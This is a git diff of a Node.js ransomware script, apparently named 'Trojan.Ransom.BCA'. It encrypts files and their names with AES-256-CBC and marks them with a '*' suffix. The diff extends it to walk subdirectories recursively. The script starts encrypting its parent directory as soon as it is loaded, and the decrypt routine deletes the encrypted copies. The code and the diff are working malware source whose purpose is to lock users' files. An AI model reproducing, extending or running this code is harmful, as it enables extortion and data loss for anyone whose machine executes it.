@@ -4,27 +4,34 @@ const path = require('path');
 const parentDir = __dirname + "/../";
 const newKey = crypto.randomBytes(6).toString('base64');
 
-function encrypt (pathIn, key) {
+function encrypt (pathIn, key, isDir) {
     const oldName = pathIn.split('/').pop();
+    const dir = pathIn.split('/').slice(0, -1).join('/') + '/';
+    console.log(dir);
     if (oldName.slice(-1) !== "*") {
         console.log("Encrypt: " + key);
         let tmp = crypto.createCipher('aes-256-cbc', key);
         const newName = tmp.update(oldName, 'utf-8', 'hex') + tmp.final('hex') + "*";
 
-        let cipher = crypto.createCipher('aes-256-cbc', key);
-        let input = fs.createReadStream(pathIn);
-        let output = fs.createWriteStream(parentDir + newName);
+        if (isDir) {
+            // fs.rename(pathIn, dir + newName, (err) => {if (err) throw err});
+        } else {
+            let cipher = crypto.createCipher('aes-256-cbc', key);
+            let input = fs.createReadStream(pathIn);
+            let output = fs.createWriteStream(dir + newName);
 
-        input.pipe(cipher).pipe(output);
+            input.pipe(cipher).pipe(output);
 
-        output.on('finish', function () {
-            console.log('Encrypted file written to disk!');
-        });
+            output.on('finish', function () {
+                console.log('Encrypted file written to disk!');
+            });
+        }
     }
 }
 
-function decrypt (pathIn, key) {
+function decrypt (pathIn, key, isDir) {
     const oldName = pathIn.split('/').pop();
+    const dir = pathIn.split('/').slice(0, -1).join('/') + '/';
     fs.readFile(pathIn, "binary", function (err, data) {
         if (err) throw err;
 
@@ -32,29 +39,33 @@ function decrypt (pathIn, key) {
             let tmp = crypto.createDecipher('aes-256-cbc', key);
             const newName = tmp.update(oldName.slice(0, -1), 'hex','utf8') + tmp.final('utf8');
 
-            let decipher = crypto.createDecipher('aes-256-cbc', key);
-            let input = fs.createReadStream(pathIn);
-            let output = fs.createWriteStream(parentDir + "NEW_" + newName);
+            if (isDir) {
+                // fs.rename(pathIn, dir + newName, (err) => {if (err) throw err});
+            } else {
+                let decipher = crypto.createDecipher('aes-256-cbc', key);
+                let input = fs.createReadStream(pathIn);
+                let output = fs.createWriteStream(dir + "NEW_" + newName);
 
-            input.pipe(decipher).pipe(output);
+                input.pipe(decipher).pipe(output);
 
-            output.on('finish', function() {
-                console.log('Decrypted file written to disk!');
+                output.on('finish', function() {
+                    console.log('Decrypted file written to disk!');
 
-                fs.unlink(pathIn, function (err) {
-                    if (err) throw err;
-                    console.log('Deleted');
+                    fs.unlink(pathIn, function (err) {
+                        if (err) throw err;
+                        console.log('Deleted');
+                    });
                 });
-            });
+            }
         }
     });
 }
 
-function search (mode) {
-    fs.readdir( parentDir, function(err, files) {
+function search (pathIn, mode) {
+    fs.readdir( pathIn, function(err, files) {
         if(err) {
             console.error("Could not list the directory.", err );
-            process.exit( 1 );
+            process.exit(1);
         }
 
         let key;
@@ -67,26 +78,29 @@ function search (mode) {
             }
 
             files.forEach(function(file, index) {
-                let fromPath = path.join(parentDir, file);
+                let filePath = path.join(pathIn, file);
 
-                fs.stat(fromPath, function(err, stat) {
+                fs.stat(filePath, function(err, stat) {
                     if (err) {
                         console.error("Error stating file.", err);
                         return;
                     }
 
                     if(stat.isFile()) {
-                        console.log("'%s' is a file.", fromPath);
+                        console.log("'%s' is a file.", filePath);
 
                         let extension = file.split('.').pop();
                         if (file !== ".DS_Store" && extension !== "app" && extension !== "localized" && extension !== "ini") {
-                            if (mode === 0) encrypt(fromPath, key);
-                            else if (mode === 1) decrypt(fromPath, key);
+                            if (mode === 0) encrypt(filePath, key, false);
+                            else if (mode === 1) decrypt(filePath, key, false);
                         }
                     } else if(stat.isDirectory()) {
-                    console.log( "'%s' is a directory.", fromPath );
-                    if (file !== "Trojan.Ransom.BCA")
-                        console.log("Not trojan");
+                    console.log( "'%s' is a directory.", filePath);
+                    if (file !== "Trojan.Ransom.BCA") {
+                        if (mode === 0) encrypt(filePath, key, true);
+                        else if (mode === 1) decrypt(filePath, key, true);
+                        search(filePath, mode);
+                    }
                 }
 
                 });
@@ -100,7 +114,7 @@ function search (mode) {
     console.log("Process: " + key);
 }*/
 
-search(0);
+search(parentDir, 0);
 
 module.exports = {
     process: function () {
